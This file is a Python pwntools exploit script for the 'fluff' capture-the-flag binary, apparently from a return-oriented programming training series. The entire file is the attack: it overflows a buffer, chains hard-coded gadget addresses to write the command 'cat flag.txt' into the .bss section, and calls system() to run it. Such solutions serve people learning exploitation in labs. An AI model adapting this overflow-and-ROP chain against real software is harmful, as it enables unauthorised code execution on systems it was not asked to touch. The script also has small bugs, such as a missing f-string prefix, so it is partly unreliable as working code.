#!/usr/bin/python3

from pwn import *

mov_r11_into_r10_pop_pop_r12_xor_r12b_into_r10_addr = 0x000000000040084e
xchg_r11_r10_pop_addr = 0x0000000000400840
mov_r11d_addr = 0x0000000000400845                      # mov r11d, 0x602050
xor_r11_r12_pop_addr = 0x000000000040082f
pop_r12_addr = 0x0000000000400832
pop_rdi_addr = 0x00000000004008c3

def set_r11(value):
    rop = ''
    rop += p64(mov_r11d_addr)
    rop += p64(pop_r12_addr)
    rop += p64(value ^ 0x602050)
    rop += p64(xor_r11_r12_pop_addr)
    rop += 'HUGEJUNK'
    return rop

def set_r10(value):
    rop = ''
    rop += set_r11(value)
    rop += p64(xchg_r11_r10_pop_addr)
    rop += 'HUGEJUNK'
    return rop

def mov_qword_into_r10(qword):
    rop = ''
    rop += set_r11(qword)
    rop += p64(mov_r11_into_r10_pop_pop_r12_xor_r12b_into_r10_addr)
    rop += 'HUGEJUNK'
    rop += p64(0)
    return rop

# context.log_level = 'DEBUG'
elf = ELF('./fluff')

system_addr = elf.symbols.system
bss_addr = elf.bss(0)

command = 'cat flag.txt' + '\x00'*4

payload = 'A' * 40

# Move command string into bss section
for i in xrange(0, len(command), 8):
    qword = u64(command[i:i+8])
    payload += set_r10(bss_addr+i)
    payload += mov_qword_into_r10(qword)

# Execute system(&command)
payload += p64(pop_rdi_addr)
payload += p64(bss_addr)
payload += p64(system_addr)

p = process(elf.path)

p.recvuntil('> ')
p.sendline(payload)

log.info("Flag: {p.recv(1024).decode()}")
